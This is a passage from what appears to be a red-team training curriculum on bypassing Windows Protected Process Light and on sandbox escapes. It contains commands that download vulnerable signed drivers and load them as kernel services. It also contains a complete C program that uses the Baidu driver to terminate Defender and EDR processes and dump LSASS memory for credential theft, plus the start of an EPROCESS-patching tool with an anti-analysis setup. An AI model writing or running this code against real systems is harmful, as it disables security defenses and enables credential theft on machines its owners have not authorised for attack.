   - LOLBins that don't invoke AMSI (mshta, regsvr32, rundll32)

6. Why does io_uring bypass seccomp? Is this a bug or design limitation?
   - **Design limitation** - seccomp filters syscalls from userspace
   - io_uring operations execute in kernel worker threads (not syscalls)
   - seccomp BPF never sees the operations
   - Fixed in 6.6+ but requires `io_uring_disabled=2` to fully mitigate

7. How would you detect io_uring-based sandbox escapes?
   - Monitor `io_uring_setup()` syscalls in sandboxed processes
   - Use eBPF to track io_uring submission queue operations
   - Block io_uring entirely for unprivileged users (`io_uring_disabled=2`)
   - Audit container seccomp profiles to ensure io_uring syscalls are blocked

8. Why did the TOCTOU race succeed 33.6% of the time?
   - Race window between BPF LSM path check and actual file open
   - Symlink swap happens in microseconds
   - Kernel doesn't revalidate path after LSM check
   - Mitigation: Use Landlock LSM (inode-based, not path-based)

9. What's the most effective defense against these bypasses?
   - **Windows**: Tamper Protection + EDR with behavioral detection
   - **Linux**: `io_uring_disabled=2` + Landlock LSM + AppArmor/SELinux
   - **Both**: Defense in depth - don't rely on single security mechanism

## Day 3: PPL Bypass and Protected Process Exploitation

- **Goal**: Understand Protected Process Light architecture and implement bypass techniques for credential theft.
- **Activities**:
  - _Reading_:
    - [Protected Processes Light](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-)
    - [itm4n - Ghost in the PPL](https://itm4n.github.io/lsass-runasppl/) - Deep technical dive into PPL
    - [Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
  - _Online Resources_:
    - [ PPLdump Is Dead. Long Live PPLdump](https://www.youtube.com/watch?v=5xteW8Tm410)
    - [PPLdump Tool](https://github.com/itm4n/PPLdump) - Archived PPL bypass tool
    - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) - Older Kernel-based bypass
  - _Tool Setup_:
    - Mimikatz (for credential extraction)
    - WinDbg (kernel debugging)
    - pypykatz (pure Python credential extraction)
  - _Exercise_:
    - Enumerate PPL-protected processes
    - Implement PPL status checker
    - Use PPLdump to bypass LSASS protection
    - Extract credentials with Mimikatz/pypykatz

### Context: Why PPL Blocks Your Attack

Windows uses PPL to protect:

- **LSASS** (credential storage)
- **Windows Defender** (MsMpEng.exe)
- **csrss.exe** (critical system process)

Even as Administrator, you cannot inject into or dump memory from PPL processes. Red teamers need to bypass this.

### Lab Setup: Two Approaches to PPL Bypass

#### Prerequisites

1. **Isolated Lab Environment**
   - Windows 10/11 VM (VMware, VirtualBox, or Hyper-V)
   - NOT connected to production networks
   - Snapshot the VM before proceeding

2. **Administrator Privileges**
   - Run PowerShell or CMD as Administrator

3. **Disable Security Features (Lab Only!)**

   ```bash
   # Disable Windows Defender (temporary, for lab)
   Set-MpPreference -DisableRealtimeMonitoring $true

   # Check if HVCI is enabled (blocks unsigned drivers)
   Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
   # If HVCI (2) is listed, you need to disable it or use test signing
   ```

#### Option A: Using Process Termination Drivers

**Step 1: Download Drivers from LOLDrivers**

```bash
# Create drivers directory
New-Item -ItemType Directory -Path "C:\Windows_Mitigations_Lab\drivers" -Force
cd C:\Windows_Mitigations_Lab\drivers

# Download K7RKScan.sys (K7 Computing - CVE-2025-52915)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/b16e217cdca19e00c1b68bdfb28ead53b20adeabd6edcd91542f9fbf48942877.bin" -OutFile "K7RKScan.sys"

# Download ksapi64.sys (Kingsoft)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/a7681a49d1ac6efb31409f17a7011a8b.bin" -OutFile "ksapi64.sys"

# Download BdApiUtil64.sys (Baidu)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/29e1264dd642b646fbef9bd347b1b860.bin" -OutFile "BdApiUtil64.sys"

# Download wamsdk.sys (WatchDog - newest, 2025)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/b6b51508ad6f462c45fe102c85d246c8.bin" -OutFile "wamsdk.sys"

# Verify signatures
Get-AuthenticodeSignature .\*.sys
```

**Understanding the Attack Flow**

```text
┌─────────────────────────────────────────────────────────────────┐
│              PPL Bypass Attack Strategies                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STRATEGY 1: Kill EDR/AV -> Dump LSASS (Recommended)             │
│  ─────────────────────────────────────────────────              │
│  1. Use process termination driver to kill:                     │
│     - MsMpEng.exe (Windows Defender) - PPL-Antimalware          │
│     - CrowdStrike, SentinelOne, Carbon Black agents             │
│     - These are PPL but NOT critical processes                  │
│  2. With EDR dead, dump LSASS normally:                         │
│     - MiniDumpWriteDump() now succeeds                          │
│     - No hooks to detect the dump                               │
│                                                                 │
│  STRATEGY 2: Crash System -> Extract from Dump                   │
│  ─────────────────────────────────────────────                  │
│  1. Enable crash dumps: CrashDumpEnabled = 1                    │
│  2. Kill LSASS -> System crashes                                 │
│  3. After reboot, parse C:\Windows\MEMORY.DMP                   │
│  4. Use volatility3: windows.hashdump                           │
│                                                                 │
│  STRATEGY 3: EPROCESS Patching (Best for LSASS)                 │
│  ─────────────────────────────────────────────                  │
│  1. Use memory R/W driver (RTCore64, DBUtil)                    │
│  2. Find LSASS EPROCESS in kernel memory                        │
│  3. Zero the Protection field                                   │
│  4. Dump LSASS normally - no crash!                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Step 2: Load and Use BdApiUtil64.sys**

```bash
# Copy to drivers folder
Copy-Item "C:\Windows_Mitigations_Lab\drivers\BdApiUtil64.sys" -Destination "C:\Windows\System32\drivers\BdApiUtil64.sys"

# Create and start service
sc.exe create BdApiUtil64 type=kernel binPath="C:\Windows\System32\drivers\BdApiUtil64.sys"
sc.exe start BdApiUtil64

# Verify it's running
sc.exe query BdApiUtil64
```

#### Option B: Using RTCore64.sys for Memory R/W

**Step 1: Load RTCore64.sys**

```bash
# Download RTCore64.sys
Invoke-WebRequest -Uri "https://github.com/Processus-Thief/PsNotifRoutineUnloader/raw/main/RTCore64.sys" -OutFile "C:\Windows_Mitigations_Lab\drivers\RTCore64.sys"

# Copy and load
Copy-Item "C:\Windows_Mitigations_Lab\drivers\RTCore64.sys" -Destination "C:\Windows\System32\drivers\RTCore64.sys"
sc.exe create RTCore64 type=kernel binPath="C:\Windows\System32\drivers\RTCore64.sys"
sc.exe start RTCore64

# Verify
sc.exe query RTCore64
```

**Cleanup After Testing**

```bash
# Stop and remove all test drivers
$drivers = @("K7RKScan", "ksapi64", "BdApiUtil64", "wamsdk", "RTCore64")
foreach ($drv in $drivers) {
    sc.exe stop $drv 2>$null
    sc.exe delete $drv 2>$null
    Remove-Item "C:\Windows\System32\drivers\$drv.sys" -Force -ErrorAction SilentlyContinue
}

# Disable test signing
bcdedit /set testsigning off
bcdedit /set nointegritychecks off

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false

Restart-Computer
```

### Deliverables

- [ ] Understand PPL architecture and signer levels
- [ ] Analyze PPL bypass techniques (BYOVDLL, kernel)
- [ ] Implement or use existing PPL bypass tools
- [ ] Successfully dump LSASS with PPL enabled

### PPL Architecture

```text
┌─────────────────────────────────────────────────────────────────┐
│                 Protected Process Light (PPL)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PPL Signer Levels (highest to lowest):                         │
│  ─────────────────────────────────────                          │
│  WinSystem (7)      - Highest, kernel-level                     │
│  WinTcb (6)         - Trusted Computer Base                     │
│  Windows (5)        - Windows components                        │
│  Lsa (4)            - LSASS specifically                        │
│  Antimalware (3)    - AV/EDR processes                          │
│  Authenticode (2)   - Signed by trusted CA                      │
│  CodeGen (1)        - .NET native images                        │
│  None (0)           - No protection                             │
│                                                                 │
│  Access Control:                                                │
│  ├── Lower PPL cannot access higher PPL                         │
│  ├── Non-PPL cannot access any PPL                              │
│  └── Even Admin cannot inject into PPL processes                │
└─────────────────────────────────────────────────────────────────┘
```

### PPL Check Tool

```c
// ppl_checker.c - Check PPL status of processes
// Compile: cl src\ppl_checker.c /Fe:bin\ppl_check.exe advapi32.lib
// Run as Administrator!

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerWinSystem = 7,
    PsProtectedSignerMax = 8
} PS_PROTECTED_SIGNER;

typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION;

typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

#define ProcessProtectionInformation 61

const char* GetSignerName(UCHAR signer) {
    switch (signer) {
        case 0: return "None";
        case 1: return "Authenticode";
        case 2: return "CodeGen";
        case 3: return "Antimalware";
        case 4: return "Lsa";
        case 5: return "Windows";
        case 6: return "WinTcb";
        case 7: return "WinSystem";
        default: return "Unknown";
    }
}

const char* GetTypeName(UCHAR type) {
    switch (type) {
        case 0: return "None";
        case 1: return "PPL";
        case 2: return "PP";
        default: return "Unknown";
    }
}

BOOL IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return elevated;
}

void CheckProcessPPL(DWORD pid, const char* name) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return;
    }

    NtQueryInformationProcess_t NtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        CloseHandle(hProcess);
        return;
    }

    PS_PROTECTION protection = {0};
    ULONG returnLength;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess, ProcessProtectionInformation,
        &protection, sizeof(protection), &returnLength);

    if (status == 0 && protection.Level != 0) {
        printf("[%s] %s (PID %d): Signer=%s Level=0x%02X\n",
            GetTypeName(protection.Type), name, pid,
            GetSignerName(protection.Signer), protection.Level);
    }

    CloseHandle(hProcess);
}

int main() {
    printf("=== PPL Process Scanner ===\n\n");

    if (!IsElevated()) {
        printf("[!] WARNING: Not running as Administrator!\n");
        printf("[!] You may not see all protected processes.\n");
        printf("[!] Run as Administrator for complete results.\n\n");
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot: %d\n", GetLastError());
        return 1;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };

    printf("Scanning for protected processes...\n\n");

    int count = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            CheckProcessPPL(pe.th32ProcessID, pe.szExeFile);
            count++;
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    printf("\n[*] Scanned %d processes\n", count);
    printf("[*] To dump LSASS, you need to bypass PPL-Lsa protection\n");
    printf("[*] Options: BYOVD, kernel driver, or PPL bypass techniques\n");

    return 0;
}
```

**Compile and Run**:

```bash
cl src\ppl_checker.c /Fe:bin\ppl_check.exe advapi32.lib
# run from admin powershell
.\bin\ppl_check.exe
```

#### Enabling LSASS PPL Protection

The exploit demonstrates PPL bypass, but LSASS must be running as PPL first. If you see `Current PPL protection: 0x00`, enable it:

**Enable RunAsPPL via Registry:**

```powershell
# Enable LSASS PPL protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Verify the setting
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

# Reboot required
shutdown /r /t 0
```

**After reboot, verify PPL is active:**

```powershell
# Run the analyzer tool
.\bin\ppl_target_analyzer.exe

# You should see LSASS with:
# Type: Protected Light (PPL)
# Signer: Lsa (LSASS PPL)
# Level: 0x41
```

**Disable PPL (for testing):**

```powershell
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /f
shutdown /r /t 0
```

### Method 1: BdApiUtil64.sys (Baidu)

To check if PPL is enabled:

```bash
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
```

```c
// defender_killer_lsass_dump.c
// Compile: cl src\defender_killer_lsass_dump.c /Fe:bin\defender_killer.exe advapi32.lib dbghelp.lib
//
// Driver: BdApiUtil64.sys (Baidu AntiVirus)
// IOCTL: 0x800024B4 - Terminates any process by PID
// Device: \\.\BdApiUtil
//
// ATTACK FLOW:
//   1. Load BdApiUtil.sys (validly signed, no test signing!)
//   2. Kill Windows Defender (MsMpEng.exe) - PPL but not critical
//   3. Kill other EDR processes if present
//   4. Dump LSASS with MiniDumpWriteDump
//   5. Credentials can be extracted with pypykatz
//
// USAGE:
//   1. Download BdApiUtil64.sys from LOLDrivers
//   2. Place in same directory as this executable
//   3. Run as Administrator
//   4. Parse lsass.dmp with: pypykatz lsa minidump lsass.dmp

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "dbghelp.lib")

// BdApiUtil driver constants
#define BDAPI_DEVICE     L"\\\\.\\BdApiUtil"
#define BDAPI_IOCTL      0x800024B4
#define BDAPI_SVC_NAME   L"BdApiUtil64"
#define BDAPI_FILENAME   L"BdApiUtil64.sys"

// EDR/AV targets - PPL protected but NOT critical (safe to kill)
const wchar_t* g_edr_targets[] = {
    L"MsMpEng.exe",           // Windows Defender - PRIMARY TARGET
    L"MsSense.exe",           // Defender ATP
    L"SenseCncProxy.exe",     // Defender ATP
    L"SenseIR.exe",           // Defender ATP
    L"SecurityHealthService.exe", // Windows Security
    L"smartscreen.exe",       // SmartScreen
    NULL
};

// Global driver handle
HANDLE g_hDriver = INVALID_HANDLE_VALUE;

BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

BOOL LoadBdApiDriver(const wchar_t* driverPath) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    BOOL success = FALSE;

    printf("[*] Opening Service Control Manager...\n");
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        printf("[-] OpenSCManager failed: %d\n", GetLastError());
        return FALSE;
    }

    // Try to open existing service first
    hService = OpenServiceW(hSCManager, BDAPI_SVC_NAME, SERVICE_ALL_ACCESS);

    if (!hService) {
        printf("[*] Creating service for BdApiUtil...\n");
        hService = CreateServiceW(
            hSCManager,
            BDAPI_SVC_NAME,
            BDAPI_SVC_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath,
            NULL, NULL, NULL, NULL, NULL
        );

        if (!hService) {
            printf("[-] CreateService failed: %d\n", GetLastError());
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
        printf("[+] Service created\n");
    } else {
        printf("[*] Service already exists\n");
    }

    // Start the service
    printf("[*] Starting driver...\n");
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[*] Driver already running\n");
            success = TRUE;
        } else {
            printf("[-] StartService failed: %d\n", err);
        }
    } else {
        printf("[+] Driver started successfully\n");
        success = TRUE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return success;
}

BOOL OpenDriverDevice() {
    printf("[*] Opening driver device...\n");

    g_hDriver = CreateFileW(
        BDAPI_DEVICE,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (g_hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device %ls: %d\n", BDAPI_DEVICE, GetLastError());
        return FALSE;
    }

    printf("[+] Device opened: %ls\n", BDAPI_DEVICE);
    return TRUE;
}

BOOL KillProcess(DWORD pid) {
    if (g_hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Driver not opened\n");
        return FALSE;
    }

    DWORD bytesReturned = 0;
    DWORD outputBuffer = 0;

    BOOL success = DeviceIoControl(
        g_hDriver,
        BDAPI_IOCTL,
        &pid, sizeof(DWORD),
        &outputBuffer, sizeof(DWORD),
        &bytesReturned,
        NULL
    );

    return success;
}

int KillEdrProcesses() {
    int killed = 0;

    printf("\n[*] Scanning for EDR/AV processes...\n");

    for (int i = 0; g_edr_targets[i] != NULL; i++) {
        DWORD pid = FindProcessByName(g_edr_targets[i]);
        if (pid) {
            printf("  [*] Found %ls (PID %d) - Killing... ", g_edr_targets[i], pid);
            if (KillProcess(pid)) {
                printf("SUCCESS\n");
                killed++;
            } else {
                printf("FAILED (error %d)\n", GetLastError());
            }
        }
    }

    return killed;
}

// Fast raw memory dump - bypasses MiniDumpWriteDump completely
BOOL FastDumpLsass(DWORD lsassPid, const wchar_t* outputPath) {
    printf("[*] Fast raw memory dump to %ls...\n", outputPath);

    HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsass) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS for reading\n");

    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    // Allocate 1MB buffer
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        printf("[-] Failed to allocate buffer\n");
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return FALSE;
    }

    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T address = 0;
    SIZE_T total_dumped = 0;
    int regions = 0;
    DWORD start_time = GetTickCount();

    printf("[*] Scanning memory regions: ");

    while (VirtualQueryEx(hLsass, (LPCVOID)address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Only dump committed readable memory
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(hLsass, (LPCVOID)address, buffer, mbi.RegionSize, &bytes_read)) {
                DWORD bytes_written;
                WriteFile(hFile, buffer, (DWORD)bytes_read, &bytes_written, NULL);
                total_dumped += bytes_read;
                regions++;

                if (regions % 10 == 0) {
                    printf(".");
                    fflush(stdout);
                }
            }
        }

        address += mbi.RegionSize;
        if (address >= 0x7FFFFFFFFFFF) break;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1;

    printf("\n[+] Raw dump completed\n");
    printf("    Regions: %d\n", regions);
    printf("    Size: %.2f MB\n", total_dumped / (1024.0 * 1024.0));
    printf("    Time: %d seconds (%.2f MB/s)\n", elapsed,
           (total_dumped / (1024.0 * 1024.0)) / elapsed);
    printf("\n[!] This is a RAW memory dump, not minidump format\n");
    printf("[!] To extract credentials, use strings or manual parsing\n");
    printf("[!] Example: strings %ls | grep -i password\n", outputPath);

    return TRUE;
}

// Thread wrapper for DumpLsass with timeout support
DWORD WINAPI DumpLsassThread(LPVOID param) {
    const wchar_t* path = (const wchar_t*)param;
    return DumpLsass(path) ? 0 : 1;
}

BOOL DumpLsass(const wchar_t* outputPath) {
    DWORD lsassPid = FindProcessByName(L"lsass.exe");
    if (!lsassPid) {
        printf("[-] LSASS process not found\n");
        return FALSE;
    }

    printf("[*] Found LSASS (PID %d)\n", lsassPid);

    // Open LSASS with full access
    printf("[*] Opening LSASS...\n");
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!hLsass) {
        DWORD err = GetLastError();
        printf("[-] Failed to open LSASS: %d\n", err);
        if (err == 5) {
            printf("[!] Access Denied - EDR may still be running!\n");
            printf("[!] Or LSASS is PPL protected and EDR wasn't blocking us\n");
        }
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Create dump file
    printf("[*] Creating dump file: %ls\n", outputPath);
    HANDLE hFile = CreateFileW(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    // Dump memory
    printf("[*] Dumping LSASS memory...\n");
    BOOL success = MiniDumpWriteDump(
        hLsass,
        lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);
    CloseHandle(hLsass);

    if (success) {
        // Get file size
        WIN32_FILE_ATTRIBUTE_DATA fileInfo;
        LARGE_INTEGER fileSize = {0};
        if (GetFileAttributesExW(outputPath, GetFileExInfoStandard, &fileInfo)) {
            fileSize.LowPart = fileInfo.nFileSizeLow;
            fileSize.HighPart = fileInfo.nFileSizeHigh;
        }
        printf("[+] LSASS dump created: %ls (%.2f MB)\n",
               outputPath, (double)fileSize.QuadPart / (1024 * 1024));
        return TRUE;
    } else {
        printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
        DeleteFileW(outputPath);
        return FALSE;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    wchar_t driverPath[MAX_PATH];
    wchar_t dumpPath[MAX_PATH] = L"lsass.dmp";

    printf("\n");
    printf("==========================================================\n");
    printf("  BdApiUtil PPL Bypass - Kill Defender + Dump LSASS\n");
    printf("  Driver: BdApiUtil64.sys (Baidu - Signed)\n");
    printf("==========================================================\n\n");

    // Check admin
    if (!IsRunningAsAdmin()) {
        printf("[-] ERROR: Must run as Administrator!\n");
        return 1;
    }
    printf("[+] Running as Administrator\n");

    // Build driver path (same directory as executable)
    GetModuleFileNameW(NULL, driverPath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(driverPath, L'\\');
    if (lastSlash) {
        wcscpy_s(lastSlash + 1, MAX_PATH - (lastSlash - driverPath + 1), BDAPI_FILENAME);
    }

    printf("[*] Driver path: %ls\n", driverPath);

    // Check if driver file exists
    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES) {
        printf("\n[-] Driver file not found: %ls\n", driverPath);
        printf("\n[*] Download from LOLDrivers:\n");
        printf("    Invoke-WebRequest -Uri \"https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/29e1264dd642b646fbef9bd347b1b860.bin\" -OutFile \"%ls\"\n", BDAPI_FILENAME);
        return 1;
    }
    printf("[+] Driver file found\n");

    // Step 1: Load driver
    printf("\n[STEP 1] Loading BdApiUtil driver...\n");
    if (!LoadBdApiDriver(driverPath)) {
        printf("[-] Failed to load driver\n");
        return 1;
    }

    // Step 2: Open device
    printf("\n[STEP 2] Opening driver device...\n");
    if (!OpenDriverDevice()) {
        printf("[-] Failed to open driver device\n");
        return 1;
    }

    // Step 3: Kill EDR/Defender
    printf("\n[STEP 3] Killing Windows Defender and EDR...\n");
    int killed = KillEdrProcesses();
    printf("\n[+] Killed %d EDR/AV processes\n", killed);

    // Don't wait - Windows restarts Defender immediately!
    // Dump LSASS as fast as possible while Defender is dead
    if (killed > 0) {
        printf("\n[!] Windows will restart Defender immediately - dumping LSASS now!\n");
    }

    // Step 4: Dump LSASS with timeout
    printf("\n[STEP 4] Dumping LSASS memory...\n");
    printf("[*] Attempting standard minidump (30 second timeout)...\n");

    // Try standard dump with timeout
    BOOL dump_success = FALSE;
    HANDLE hDumpThread = CreateThread(NULL, 0,
        DumpLsassThread, (LPVOID)dumpPath, 0, NULL);

    if (hDumpThread) {
        DWORD wait_result = WaitForSingleObject(hDumpThread, 30000); // 30 second timeout

        if (wait_result == WAIT_TIMEOUT) {
            printf("[!] Minidump timed out after 30 seconds\n");
            printf("[*] This indicates VM security monitoring or AV interference\n");
            printf("[*] Falling back to fast raw memory dump...\n");
            TerminateThread(hDumpThread, 1);
            CloseHandle(hDumpThread);

            // Try fast dump instead
            wchar_t rawDumpPath[MAX_PATH];
            wcscpy_s(rawDumpPath, MAX_PATH, dumpPath);
            wcscat_s(rawDumpPath, MAX_PATH, L".raw");

            dump_success = FastDumpLsass(FindProcessByName(L"lsass.exe"), rawDumpPath);
        } else if (wait_result == WAIT_OBJECT_0) {
            DWORD exit_code;
            GetExitCodeThread(hDumpThread, &exit_code);
            dump_success = (exit_code == 0);
            CloseHandle(hDumpThread);
        }
    }

    if (!dump_success) {
        printf("[-] All dump methods failed\n");
        CloseHandle(g_hDriver);
        return 1;
    }

    // Cleanup
    CloseHandle(g_hDriver);

    // Success!
    printf("\n");
    printf("==========================================================\n");
    printf("  SUCCESS! Credentials extracted.\n");
    printf("==========================================================\n");
    printf("\n");
    printf("[*] Parse the dump with pypykatz:\n");
    printf("    pypykatz lsa minidump %ls\n", dumpPath);
    printf("\n");
    printf("[*] Or with Mimikatz:\n");
    printf("    sekurlsa::minidump %ls\n", dumpPath);
    printf("    sekurlsa::logonpasswords\n");
    printf("\n");

    return 0;
}
```

**Compilation and Usage:**

```bash
# Compile the code
cl src\defender_killer_lsass_dump.c /Fe:bin\defender_killer.exe advapi32.lib dbghelp.lib

# Run as Administrator
.\bin\defender_killer.exe

# Parse credentials
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Method 2: EPROCESS Patching (RTCore64.sys)

**Debugging crashes:**

```bash
# Analyze the minidump
windbg -z C:\Windows\Minidump\<dumpfile>.dmp

# In WinDbg:
!analyze -v                   # Get crash details
dt nt!_EPROCESS               # Verify structure offsets for your build
x nt!PsInitialSystemProcess   # Get System EPROCESS address
dt nt!_EPROCESS <address>     # Dump System EPROCESS

# Key offsets to verify:
# UniqueProcessId - should be 0x1D0 or 0x440 for Win11 24H2
# ActiveProcessLinks - should be 0x1D8 or 0x448 for Win11 24H2
# Protection - should be 0x5FA or 0x87A for Win11 24H2
```

if the code below crashed your vm, check with the instructions up there to find the correct offsets

```c
// ppl_bypass_rtcore.c - Strip PPL via EPROCESS patching using RTCore64.sys
// Compile: cl src\ppl_bypass_rtcore.c /Fe:bin\ppl_bypass.exe advapi32.lib ntdll.lib dbghelp.lib psapi.lib
// This uses RTCore64.sys kernel R/W to:
//   1. Leak kernel base address
//   2. Find PsActiveProcessHead
//   3. Walk EPROCESS linked list to find LSASS
//   4. Zero the Protection field to strip PPL
//   5. Dump LSASS with MiniDumpWriteDump
//

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <psapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

typedef struct _ANTI_ANALYSIS_CTX {
    BOOL is_edr_present;
    BOOL is_sandbox;
    BOOL is_vm;
    BOOL is_debugger;
    DWORD stealth_level;
} ANTI_ANALYSIS_CTX;

static ANTI_ANALYSIS_CTX g_anti_ctx = {0};

// Driver vulnerability database
typedef struct _DRIVER_INFO {
    WCHAR name[64];
    WCHAR device_path[256];
    DWORD read_ioctl;
    DWORD write_ioctl;
    DWORD cve_year;
    WCHAR vendor[64];
    BOOL is_loaded;
} DRIVER_INFO;

static DRIVER_INFO g_vulnerable_drivers[] = {
